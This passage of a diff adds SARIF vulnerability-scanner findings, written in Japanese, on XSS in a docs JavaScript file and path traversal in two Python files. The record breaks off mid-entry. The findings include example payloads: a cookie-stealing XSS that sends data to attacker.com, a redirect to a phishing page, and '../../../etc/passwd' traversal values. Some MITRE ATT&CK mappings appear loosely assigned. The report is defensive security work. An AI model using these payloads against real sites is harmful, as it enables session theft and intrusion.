+            "text": "XSS: ### XSS脆弱性: DOM操作への信頼できないデータの挿入\n\n**問題**: GitHub APIから取得した外部データが直接HTMLコンテンツとしてDOMに挿入されています。\n\n**詳細**:\n- **Principal**: GitHub API v3 REST API（信頼できない外部ソース）\n  - `v.html_url`: リポジトリのURL\n  - `v.full_name`: リポジトリの完全名\n  - `v.owner.html_url`: オーナーのプロフィールURL\n  - `v.owner.login`: オーナーのログイン名\n\n- **Action**: セキュリティ制御が欠如\n  - HTMLエスケープ処理なし\n  - バリデーション処理なし\n  - サニタイズ処理なし\n\n- **Resource**: DOM操作\n  - 170行目: `li.innerHTML` により、信頼できないデータが直接HTMLとして解釈されます\n\n**攻撃シナリオ**:\n1. GitHub APIが中間者攻撃(MITM)により改ざんされた場合\n2. APIレスポンスに悪質なJavaScriptを含めることで、ページ訪問者の環境で実行される\n3. 例: `v.html_url = 'javascript:alert(1)'` または `v.full_name = '<img src=x onerror=alert(1)>'`\n\n**推奨される修正**:\n- `innerHTML` の代わりに `textContent` を使用するか、`innerText` を使用\n- または、`createElement` と `setAttribute` で安全にDOM要素を構築\n- API応答の入力バリデーション実装",
+            "markdown": "### XSS脆弱性: DOM操作への信頼できないデータの挿入\n\n**問題**: GitHub APIから取得した外部データが直接HTMLコンテンツとしてDOMに挿入されています。\n\n**詳細**:\n- **Principal**: GitHub API v3 REST API（信頼できない外部ソース）\n  - `v.html_url`: リポジトリのURL\n  - `v.full_name`: リポジトリの完全名\n  - `v.owner.html_url`: オーナーのプロフィールURL\n  - `v.owner.login`: オーナーのログイン名\n\n- **Action**: セキュリティ制御が欠如\n  - HTMLエスケープ処理なし\n  - バリデーション処理なし\n  - サニタイズ処理なし\n\n- **Resource**: DOM操作\n  - 170行目: `li.innerHTML` により、信頼できないデータが直接HTMLとして解釈されます\n\n**攻撃シナリオ**:\n1. GitHub APIが中間者攻撃(MITM)により改ざんされた場合\n2. APIレスポンスに悪質なJavaScriptを含めることで、ページ訪問者の環境で実行される\n3. 例: `v.html_url = 'javascript:alert(1)'` または `v.full_name = '<img src=x onerror=alert(1)>'`\n\n**推奨される修正**:\n- `innerHTML` の代わりに `textContent` を使用するか、`innerText` を使用\n- または、`createElement` と `setAttribute` で安全にDOM要素を構築\n- API応答の入力バリデーション実装"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+                  "index": 5
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "ad99746483a892a2"
+          },
+          "properties": {
+            "confidence": 0.9,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "GitHub API v3 REST API (external untrusted source)",
+            "action": "No validation, sanitization, or encoding applied",
+            "resource": "DOM innerHTML property at line 170",
+            "data_flow": "GitHub API response → v object properties → template literal → innerHTML"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "XSS: ## Cross-Site Scripting (XSS) 脆弱性\n\n### 問題\nGitHub APIから取得した外部データが、入力検証やサニタイズなしに直接 DOM の `innerHTML` プロパティに挿入されています。\n\n### 脆弱性の詳細\n\n**Principal（信頼できないデータソース）:**\n- `https://api.github.com/search/repositories?q=topic:fastapi&per_page=100&page=${page}` からのレスポンス\n- 特に以下のフィールドが危険:\n  - `v.html_url`: リポジトリの URL\n  - `v.full_name`: リポジトリのフルネーム\n  - `v.owner.html_url`: オーナーの URL\n  - `v.owner.login`: オーナーのログイン名\n\n**Resource（保護されるべきリソース）:**\n- ブラウザの DOM\n- ページのスクリプト実行コンテキスト\n\n**Action（セキュリティ制御）:**\n- ✗ 入力検証なし\n- ✗ 出力エスケープなし\n- ✗ サニタイズなし\n- ✗ Content Security Policy (CSP) による保護なし\n\n### 攻撃シナリオ\n\n1. 攻撃者が GitHub でマルウェア リポジトリを作成\n2. リポジトリ名に XSS ペイロードを含める: `<img src=x onerror=\"alert('XSS')\">` または `<script>...</script>`\n3. ユーザーがこのドキュメントページを訪問\n4. `main()` 関数が GitHub API からリポジトリデータを取得\n5. リポジトリ名（XSS ペイロード）が `innerHTML` で HTML として解析・実行される\n6. ページの閲覧者のセッション、クッキー、または認証情報が窃取される\n\n### 技術的詳細\n\n**脆弱なコード (行170):**\n```javascript\nli.innerHTML = \\`<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>\\`\n```\n\n`v.full_name` が `fastapi/<img src=x onerror=\"console.log('xss')\">/repo` のような値の場合、HTML として実行されます。\n\n同様に行163も危険:\n```javascript\ndiv.innerHTML = '<ul></ul>'\n```\n\n### 攻撃可能性\n- **HTTP Request: T1190** - 外部エンティティを利用した攻撃\n- **Exploitation for Client Execution: T1203** (MITRE ATT&CK) - クライアントブラウザでの任意コード実行\n\n### 推奨される修正\n\n1. **`innerHTML` を `textContent` に変更:**\n   ```javascript\n   li.textContent = \\`...\\`  // テキストのみを設定\n   ```\n\n2. **DOM API を使用して安全に要素を構築:**\n   ```javascript\n   const a1 = document.createElement('a');\n   a1.href = v.html_url;\n   a1.target = '_blank';\n   a1.textContent = \\`★ ${v.stargazers_count} - ${v.full_name}\\`;\n   \n   const a2 = document.createElement('a');\n   a2.href = v.owner.html_url;\n   a2.target = '_blank';\n   a2.textContent = \\`@${v.owner.login}\\`;\n   \n   li.appendChild(a1);\n   li.appendChild(document.createTextNode(' by '));\n   li.appendChild(a2);\n   ```\n\n3. **DOMPurify などのライブラリを使用:**\n   ```javascript\n   li.innerHTML = DOMPurify.sanitize(htmlString);\n   ```\n\n### CVSS スコア\n- **ベクトル: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N**\n- **スコア: 8.7 (高)**\n\n### CWE\n- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\n### OWASP Top 10\n- **A03:2021 - Injection**\n- **A07:2021 - Cross-Site Scripting (XSS)**\n",
+            "markdown": "## Cross-Site Scripting (XSS) 脆弱性\n\n### 問題\nGitHub APIから取得した外部データが、入力検証やサニタイズなしに直接 DOM の `innerHTML` プロパティに挿入されています。\n\n### 脆弱性の詳細\n\n**Principal（信頼できないデータソース）:**\n- `https://api.github.com/search/repositories?q=topic:fastapi&per_page=100&page=${page}` からのレスポンス\n- 特に以下のフィールドが危険:\n  - `v.html_url`: リポジトリの URL\n  - `v.full_name`: リポジトリのフルネーム\n  - `v.owner.html_url`: オーナーの URL\n  - `v.owner.login`: オーナーのログイン名\n\n**Resource（保護されるべきリソース）:**\n- ブラウザの DOM\n- ページのスクリプト実行コンテキスト\n\n**Action（セキュリティ制御）:**\n- ✗ 入力検証なし\n- ✗ 出力エスケープなし\n- ✗ サニタイズなし\n- ✗ Content Security Policy (CSP) による保護なし\n\n### 攻撃シナリオ\n\n1. 攻撃者が GitHub でマルウェア リポジトリを作成\n2. リポジトリ名に XSS ペイロードを含める: `<img src=x onerror=\"alert('XSS')\">` または `<script>...</script>`\n3. ユーザーがこのドキュメントページを訪問\n4. `main()` 関数が GitHub API からリポジトリデータを取得\n5. リポジトリ名（XSS ペイロード）が `innerHTML` で HTML として解析・実行される\n6. ページの閲覧者のセッション、クッキー、または認証情報が窃取される\n\n### 技術的詳細\n\n**脆弱なコード (行170):**\n```javascript\nli.innerHTML = \\`<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>\\`\n```\n\n`v.full_name` が `fastapi/<img src=x onerror=\"console.log('xss')\">/repo` のような値の場合、HTML として実行されます。\n\n同様に行163も危険:\n```javascript\ndiv.innerHTML = '<ul></ul>'\n```\n\n### 攻撃可能性\n- **HTTP Request: T1190** - 外部エンティティを利用した攻撃\n- **Exploitation for Client Execution: T1203** (MITRE ATT&CK) - クライアントブラウザでの任意コード実行\n\n### 推奨される修正\n\n1. **`innerHTML` を `textContent` に変更:**\n   ```javascript\n   li.textContent = \\`...\\`  // テキストのみを設定\n   ```\n\n2. **DOM API を使用して安全に要素を構築:**\n   ```javascript\n   const a1 = document.createElement('a');\n   a1.href = v.html_url;\n   a1.target = '_blank';\n   a1.textContent = \\`★ ${v.stargazers_count} - ${v.full_name}\\`;\n   \n   const a2 = document.createElement('a');\n   a2.href = v.owner.html_url;\n   a2.target = '_blank';\n   a2.textContent = \\`@${v.owner.login}\\`;\n   \n   li.appendChild(a1);\n   li.appendChild(document.createTextNode(' by '));\n   li.appendChild(a2);\n   ```\n\n3. **DOMPurify などのライブラリを使用:**\n   ```javascript\n   li.innerHTML = DOMPurify.sanitize(htmlString);\n   ```\n\n### CVSS スコア\n- **ベクトル: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N**\n- **スコア: 8.7 (高)**\n\n### CWE\n- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\n### OWASP Top 10\n- **A03:2021 - Injection**\n- **A07:2021 - Cross-Site Scripting (XSS)**\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+                  "index": 6
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "5e951570e79c6518"
+          },
+          "properties": {
+            "confidence": 0.9,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "External GitHub API response (v.html_url, v.full_name, v.owner.html_url, v.owner.login)",
+            "action": "No input validation, sanitization, or output escaping applied",
+            "resource": "Browser DOM via innerHTML assignment (line 170)",
+            "data_flow": "GitHub API → getDataBatch() → getData() → main() → data.forEach() → li.innerHTML with unsanitized external data"
+          }
+        },
+        {
+          "ruleId": "AFO",
+          "ruleIndex": 2,
+          "level": "error",
+          "message": {
+            "text": "AFO: ## 任意ファイル操作（Arbitrary File Operation）\n\n**脆弱性**: `oauth2_file`パラメータが `open()` に直接渡されており、パストラバーサル対策がありません。\n\n**Principal**: `get_oauth2_info(oauth2_file)` 関数の `oauth2_file` 引数（呼び出し元から制御可能）\n\n**Action**: \n- `os.path.expanduser()` はユーザーホームディレクトリの展開のみを行う\n- 相対パス `../` や絶対パスのバリデーションがない\n- ファイル存在確認（`os.path.isfile()`）のみで十分ではない\n\n**Resource**: \n- 読み込み: 104行の `open(oauth2_file)` で任意のファイルを読み込める\n- 書き込み: 120行、136行の `open(oauth2_file, \"w\")` で任意のファイルを上書きできる\n\n**攻撃シナリオ**: \n- 攻撃者が `oauth2_file=\"../../../etc/passwd\"` などを指定してシステムファイルを読み込める\n- 攻撃者が `oauth2_file=\"../../../tmp/malicious_config\"` でアプリケーション設定を上書きできる\n- 機密情報（OAuth2トークン）が含まれたファイルを任意の場所に作成される\n\n**信頼度**: 90%",
+            "markdown": "## 任意ファイル操作（Arbitrary File Operation）\n\n**脆弱性**: `oauth2_file`パラメータが `open()` に直接渡されており、パストラバーサル対策がありません。\n\n**Principal**: `get_oauth2_info(oauth2_file)` 関数の `oauth2_file` 引数（呼び出し元から制御可能）\n\n**Action**: \n- `os.path.expanduser()` はユーザーホームディレクトリの展開のみを行う\n- 相対パス `../` や絶対パスのバリデーションがない\n- ファイル存在確認（`os.path.isfile()`）のみで十分ではない\n\n**Resource**: \n- 読み込み: 104行の `open(oauth2_file)` で任意のファイルを読み込める\n- 書き込み: 120行、136行の `open(oauth2_file, \"w\")` で任意のファイルを上書きできる\n\n**攻撃シナリオ**: \n- 攻撃者が `oauth2_file=\"../../../etc/passwd\"` などを指定してシステムファイルを読み込める\n- 攻撃者が `oauth2_file=\"../../../tmp/malicious_config\"` でアプリケーション設定を上書きできる\n- 機密情報（OAuth2トークン）が含まれたファイルを任意の場所に作成される\n\n**信頼度**: 90%"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/mad-hatter/yagmail/oauth2.py",
+                  "index": 7
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "ad2394cd5dfa9296"
+          },
+          "properties": {
+            "confidence": 0.9,
+            "mitre_attack": [
+              "T1083",
+              "T1005"
+            ],
+            "cwe": [
+              "CWE-22",
+              "CWE-73"
+            ],
+            "owasp": [
+              "A01:2021-Broken Access Control"
+            ],
+            "principal": "Function parameter: oauth2_file (external input)",
+            "action": "No path validation - only os.path.expanduser() applied",
+            "resource": "File read/write operations (lines 104, 120, 136)",
+            "data_flow": "oauth2_file parameter → os.path.expanduser() → open()/write operations"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "XSS: ## XSS脆弱性: GitHub API データの未検証DOM挿入\n\n### 脆弱性の概要\n\nGitHub Search API から取得した外部データが、入力検証やサニタイズなしに直接 `innerHTML` で DOM に挿入されています。これにより、攻撃者が任意の JavaScript コードを実行できる可能性があります。\n\n### 脆弱なコード分析\n\n**コード箇所**: repo/gitea/repositories/dodo/docs/en/docs/js/custom.js, 165-171行目\n\n```javascript\ndata.forEach(v => {\n    if (v.full_name === 'tiangolo/fastapi') {\n        return\n    }\n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>`\n    ul.append(li)\n})\n```\n\n### PAR (Principal-Action-Resource) フレームワーク分析\n\n#### **Principal（プリンシパル - 信頼できないデータ源）**\n\nGitHub API v3 Search Repositories Endpoint のレスポンス:\n- `v.html_url`: リポジトリへのHTTP URL\n- `v.full_name`: リポジトリの完全名 (e.g., \"user/repo\")\n- `v.stargazers_count`: スター数（数値）\n- `v.owner.html_url`: オーナープロフィールURL\n- `v.owner.login`: オーナーのログイン名\n\n外部API からのレスポンスは信頼できないデータです。特にリポジトリ情報（名前、URL）はユーザーが直接制御可能なため、悪意のあるペイロードを含む可能性があります。\n\n#### **Action（アクション - セキュリティ制御）**\n\n**現状**: セキュリティ制御が **完全に欠如**\n- HTML エスケープ処理: なし\n- 入力バリデーション: なし\n- サニタイズ処理: なし\n- Content Security Policy (CSP): 不明（別ファイルに記載の可能性）\n\nデータは直接テンプレートリテラル内に埋め込まれ、何の検証も経ずに HTML として解釈されます。\n\n#### **Resource（リソース - 危険な操作）**\n\nDOM 要素への `innerHTML` プロパティによる直接 HTML 挿入:\n```javascript\nli.innerHTML = `...${v.html_url}...${v.full_name}...${v.owner.html_url}...${v.owner.login}...`\n```\n\n`innerHTML` はブラウザに HTML を解釈させるため、含まれるスクリプトが実行されます。\n\n### 攻撃シナリオ\n\n#### シナリオ1: 悪意のあるリポジトリの作成\n1. 攻撃者が GitHub で悪意のあるリポジトリを作成\n2. リポジトリの `full_name` を特別に設定 (e.g., `attacker/<img src=x onerror=\"alert(document.cookie)\">`)\n3. FastAPI トピックでタグ付けして、API検索結果に含まれるようにする\n4. 当該ページを訪問したユーザーのクライアント環境でスクリプトが実行される\n5. クッキーやセッショントークンの窃取、CSRF攻撃の実行などが可能\n\n#### シナリオ2: 中間者攻撃(MITM)による改ざん\n1. HTTPS をサポートしていない通信路での MITM\n2. または HTTPS ピンニングの欠如により通信路を盗聴・改ざん\n3. GitHub API レスポンスを改ざんし、ペイロードを注入\n4. ユーザーが訪問するたびにマルウェアが実行される\n\n#### 具体的なペイロード例\n\n```javascript\n// リポジトリ名フィールドに以下を設定\nv.full_name = \"user/<img src=x onerror=\\\"fetch('https://attacker.com/steal?c=' + document.cookie)\\\">\";\n\n// または URL フィールド\nv.html_url = \"javascript:alert('XSS')\";\n\n// オーナー名フィールド\nv.owner.login = \"<svg onload=\\\"window.location='https://attacker.com/phishing'\\\">\";\n```\n\n### 影響範囲\n\n- **認証情報の窃取**: クッキー、ローカルストレージ、セッショントークン\n- **セッションハイジャック**: ユーザーになりすまし可能\n- **フィッシング**: フィッシング ページへのリダイレクト\n- **マルウェア配布**: 悪意のあるスクリプト実行\n- **CSRF 攻撃**: ユーザーに無断でアクション実行\n- **ページ改ざん**: ユーザーに見える情報の改変\n\n### 関連する脅威と分類\n\n- **OWASP**: A03:2021 – Injection\n- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)\n- **CVSS v3.1**: High severity (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)\n- **MITRE ATT&CK**: \n  - T1055: Process Injection\n  - T1106: Native API (DOM API)\n  - T1583: Acquire Infrastructure\n\n### 推奨される修正\n\n#### 修正1: DOM API を使用（推奨）\n\n```javascript\ndata.forEach(v => {\n    if (v.full_name === 'tiangolo/fastapi') {\n        return\n    }\n    const li = document.createElement('li')\n    \n    // リンク1を作成\n    const a1 = document.createElement('a')\n    a1.href = v.html_url\n    a1.target = '_blank'\n    a1.textContent = `★ ${v.stargazers_count} - ${v.full_name}`\n    \n    // テキスト分割を作成\n    const text = document.createTextNode(' by ')\n    \n    // リンク2を作成\n    const a2 = document.createElement('a')\n    a2.href = v.owner.html_url\n    a2.target = '_blank'\n    a2.textContent = `@${v.owner.login}`\n    \n    // DOM ツリーに追加\n    li.appendChild(a1)\n    li.appendChild(text)\n    li.appendChild(a2)\n    ul.append(li)\n})\n```\n\n**利点**:\n- HTML パースが行われない\n- `textContent` はテキストとして扱われる\n- JavaScript 実行の可能性が完全に排除される\n\n#### 修正2: URL バリデーション + HTML エスケープ\n\n```javascript\n// URL バリデーション関数\nconst isValidUrl = (url) => {\n    try {\n        const parsed = new URL(url)\n        return parsed.protocol === 'http:' || parsed.protocol === 'https:'\n    } catch {\n        return false\n    }\n}\n\n// HTML エスケープ関数\nconst escapeHtml = (text) => {\n    const div = document.createElement('div')\n    div.textContent = text\n    return div.innerHTML\n}\n\ndata.forEach(v => {\n    if (v.full_name === 'tiangolo/fastapi') {\n        return\n    }\n    \n    // URL バリデーション\n    if (!isValidUrl(v.html_url) || !isValidUrl(v.owner.html_url)) {\n        console.warn(`Invalid URL detected: ${v.html_url}`)\n        return\n    }\n    \n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${escapeHtml(v.html_url)}\" target=\"_blank\">★ ${escapeHtml(String(v.stargazers_count))} - ${escapeHtml(v.full_name)}</a> by <a href=\"${escapeHtml(v.owner.html_url)}\" target=\"_blank\">@${escapeHtml(v.owner.login)}</a>`\n    ul.append(li)\n})\n```\n\n#### 修正3: Content Security Policy (CSP)\n\nHTML ファイルに以下を追加:\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self'; img-src 'self' https:; style-src 'self' 'unsafe-inline';\">\n```\n\nこれにより、インラインスクリプトの実行がブロックされます。\n\n### テスト方法\n\n1. リポジトリ名に `<img src=x onerror=alert('XSS')>` を含むテストペイロードを使用\n2. 修正後、ブラウザコンソールで alert が出現しないことを確認\n3. ページの表示が正常に行われることを確認",
+            "markdown": "## XSS脆弱性: GitHub API データの未検証DOM挿入\n\n### 脆弱性の概要\n\nGitHub Search API から取得した外部データが、入力検証やサニタイズなしに直接 `innerHTML` で DOM に挿入されています。これにより、攻撃者が任意の JavaScript コードを実行できる可能性があります。\n\n### 脆弱なコード分析\n\n**コード箇所**: repo/gitea/repositories/dodo/docs/en/docs/js/custom.js, 165-171行目\n\n```javascript\ndata.forEach(v => {\n    if (v.full_name === 'tiangolo/fastapi') {\n        return\n    }\n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>`\n    ul.append(li)\n})\n```\n\n### PAR (Principal-Action-Resource) フレームワーク分析\n\n#### **Principal（プリンシパル - 信頼できないデータ源）**\n\nGitHub API v3 Search Repositories Endpoint のレスポンス:\n- `v.html_url`: リポジトリへのHTTP URL\n- `v.full_name`: リポジトリの完全名 (e.g., \"user/repo\")\n- `v.stargazers_count`: スター数（数値）\n- `v.owner.html_url`: オーナープロフィールURL\n- `v.owner.login`: オーナーのログイン名\n\n外部API からのレスポンスは信頼できないデータです。特にリポジトリ情報（名前、URL）はユーザーが直接制御可能なため、悪意のあるペイロードを含む可能性があります。\n\n#### **Action（アクション - セキュリティ制御）**\n\n**現状**: セキュリティ制御が **完全に欠如**\n- HTML エスケープ処理: なし\n- 入力バリデーション: なし\n- サニタイズ処理: なし\n- Content Security Policy (CSP): 不明（別ファイルに記載の可能性）\n\nデータは直接テンプレートリテラル内に埋め込まれ、何の検証も経ずに HTML として解釈されます。\n\n#### **Resource（リソース - 危険な操作）**\n\nDOM 要素への `innerHTML` プロパティによる直接 HTML 挿入:\n```javascript\nli.innerHTML = `...${v.html_url}...${v.full_name}...${v.owner.html_url}...${v.owner.login}...`\n```\n\n`innerHTML` はブラウザに HTML を解釈させるため、含まれるスクリプトが実行されます。\n\n### 攻撃シナリオ\n\n#### シナリオ1: 悪意のあるリポジトリの作成\n1. 攻撃者が GitHub で悪意のあるリポジトリを作成\n2. リポジトリの `full_name` を特別に設定 (e.g., `attacker/<img src=x onerror=\"alert(document.cookie)\">`)\n3. FastAPI トピックでタグ付けして、API検索結果に含まれるようにする\n4. 当該ページを訪問したユーザーのクライアント環境でスクリプトが実行される\n5. クッキーやセッショントークンの窃取、CSRF攻撃の実行などが可能\n\n#### シナリオ2: 中間者攻撃(MITM)による改ざん\n1. HTTPS をサポートしていない通信路での MITM\n2. または HTTPS ピンニングの欠如により通信路を盗聴・改ざん\n3. GitHub API レスポンスを改ざんし、ペイロードを注入\n4. ユーザーが訪問するたびにマルウェアが実行される\n\n#### 具体的なペイロード例\n\n```javascript\n// リポジトリ名フィールドに以下を設定\nv.full_name = \"user/<img src=x onerror=\\\"fetch('https://attacker.com/steal?c=' + document.cookie)\\\">\";\n\n// または URL フィールド\nv.html_url = \"javascript:alert('XSS')\";\n\n// オーナー名フィールド\nv.owner.login = \"<svg onload=\\\"window.location='https://attacker.com/phishing'\\\">\";\n```\n\n### 影響範囲\n\n- **認証情報の窃取**: クッキー、ローカルストレージ、セッショントークン\n- **セッションハイジャック**: ユーザーになりすまし可能\n- **フィッシング**: フィッシング ページへのリダイレクト\n- **マルウェア配布**: 悪意のあるスクリプト実行\n- **CSRF 攻撃**: ユーザーに無断でアクション実行\n- **ページ改ざん**: ユーザーに見える情報の改変\n\n### 関連する脅威と分類\n\n- **OWASP**: A03:2021 – Injection\n- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)\n- **CVSS v3.1**: High severity (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)\n- **MITRE ATT&CK**: \n  - T1055: Process Injection\n  - T1106: Native API (DOM API)\n  - T1583: Acquire Infrastructure\n\n### 推奨される修正\n\n#### 修正1: DOM API を使用（推奨）\n\n```javascript\ndata.forEach(v => {\n    if (v.full_name === 'tiangolo/fastapi') {\n        return\n    }\n    const li = document.createElement('li')\n    \n    // リンク1を作成\n    const a1 = document.createElement('a')\n    a1.href = v.html_url\n    a1.target = '_blank'\n    a1.textContent = `★ ${v.stargazers_count} - ${v.full_name}`\n    \n    // テキスト分割を作成\n    const text = document.createTextNode(' by ')\n    \n    // リンク2を作成\n    const a2 = document.createElement('a')\n    a2.href = v.owner.html_url\n    a2.target = '_blank'\n    a2.textContent = `@${v.owner.login}`\n    \n    // DOM ツリーに追加\n    li.appendChild(a1)\n    li.appendChild(text)\n    li.appendChild(a2)\n    ul.append(li)\n})\n```\n\n**利点**:\n- HTML パースが行われない\n- `textContent` はテキストとして扱われる\n- JavaScript 実行の可能性が完全に排除される\n\n#### 修正2: URL バリデーション + HTML エスケープ\n\n```javascript\n// URL バリデーション関数\nconst isValidUrl = (url) => {\n    try {\n        const parsed = new URL(url)\n        return parsed.protocol === 'http:' || parsed.protocol === 'https:'\n    } catch {\n        return false\n    }\n}\n\n// HTML エスケープ関数\nconst escapeHtml = (text) => {\n    const div = document.createElement('div')\n    div.textContent = text\n    return div.innerHTML\n}\n\ndata.forEach(v => {\n    if (v.full_name === 'tiangolo/fastapi') {\n        return\n    }\n    \n    // URL バリデーション\n    if (!isValidUrl(v.html_url) || !isValidUrl(v.owner.html_url)) {\n        console.warn(`Invalid URL detected: ${v.html_url}`)\n        return\n    }\n    \n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${escapeHtml(v.html_url)}\" target=\"_blank\">★ ${escapeHtml(String(v.stargazers_count))} - ${escapeHtml(v.full_name)}</a> by <a href=\"${escapeHtml(v.owner.html_url)}\" target=\"_blank\">@${escapeHtml(v.owner.login)}</a>`\n    ul.append(li)\n})\n```\n\n#### 修正3: Content Security Policy (CSP)\n\nHTML ファイルに以下を追加:\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self'; img-src 'self' https:; style-src 'self' 'unsafe-inline';\">\n```\n\nこれにより、インラインスクリプトの実行がブロックされます。\n\n### テスト方法\n\n1. リポジトリ名に `<img src=x onerror=alert('XSS')>` を含むテストペイロードを使用\n2. 修正後、ブラウザコンソールで alert が出現しないことを確認\n3. ページの表示が正常に行われることを確認"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+                  "index": 8
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "8fb10113027bd87a"
+          },
+          "properties": {
+            "confidence": 0.9,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "GitHub API v3 REST API (external untrusted source)",
+            "action": "No validation, sanitization, or encoding applied",
+            "resource": "DOM innerHTML property at line 170",
+            "data_flow": "GitHub API response → v object properties → template literal → innerHTML"
+          }
+        },
+        {
+          "ruleId": "AFO",
+          "ruleIndex": 2,
+          "level": "error",
+          "message": {
+            "text": "AFO: ## 脆弱性分析\n\n### Principal (実行主体)\nコマンドライン引数 `sys.argv[1]` - 完全に信頼できないユーザー入力\n\n### Action (セキュリティ制御)\n入力ファイルパスに対する検証やサニタイゼーションが存在しません。以下の制御が欠落しています：\n- パストラバーサル攻撃への対策\n- ファイルパスの正規化\n- ホワイトリストベースの検証\n\n### Resource (対象リソース)\n`open(sys.argv[1], \"wb\")` - ファイルシステムへの直接的な書き込み操作\n\n### 攻撃フロー\n1. 攻撃者が `python export.py \"../../../etc/passwd\"` を実行\n2. `sys.argv[1]` に制御されたパストラバーサルシーケンスが格納される\n3. バリデーションなくファイルが開かれ、CTFエクスポートデータが任意の場所に書き込まれる\n4. システムの重要なファイルが上書きされたり、権限昇格が発生する可能性\n\n### リスク\n- 任意の場所へのファイル上書き\n- 重要なシステムファイルの破損\n- 権限がある場合、システムの整合性侵害\n- 情報漏洩（既存ファイルを指定した場合）",
+            "markdown": "## 脆弱性分析\n\n### Principal (実行主体)\nコマンドライン引数 `sys.argv[1]` - 完全に信頼できないユーザー入力\n\n### Action (セキュリティ制御)\n入力ファイルパスに対する検証やサニタイゼーションが存在しません。以下の制御が欠落しています：\n- パストラバーサル攻撃への対策\n- ファイルパスの正規化\n- ホワイトリストベースの検証\n\n### Resource (対象リソース)\n`open(sys.argv[1], \"wb\")` - ファイルシステムへの直接的な書き込み操作\n\n### 攻撃フロー\n1. 攻撃者が `python export.py \"../../../etc/passwd\"` を実行\n2. `sys.argv[1]` に制御されたパストラバーサルシーケンスが格納される\n3. バリデーションなくファイルが開かれ、CTFエクスポートデータが任意の場所に書き込まれる\n4. システムの重要なファイルが上書きされたり、権限昇格が発生する可能性\n\n### リスク\n- 任意の場所へのファイル上書き\n- 重要なシステムファイルの破損\n- 権限がある場合、システムの整合性侵害\n- 情報漏洩（既存ファイルを指定した場合）"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/export.py",
+                  "index": 9
+                },
+                "region": {
+                  "startLine": 1,
+                  "snippet": {
+                    "text": "sys.argv[1] → open() → ファイル書き込み"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "fea0543d2a1d4061"
+          },
+          "properties": {
+            "confidence": 0.9,
+            "mitre_attack": [
+              "T1083",
+              "T1005"
+            ],
+            "cwe": [
+              "CWE-22",
+              "CWE-73"
+            ],
+            "owasp": [
+              "A01:2021-Broken Access Control"
+            ],
+            "principal": "sys.argv[1] - コマンドライン引数（ユーザー入力）",
+            "action": "検証なし - セキュリティ制御が欠落",
+            "resource": "ファイルシステムへの書き込み操作",
+            "data_flow": "sys.argv[1] → open() → ファイル書き込み"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
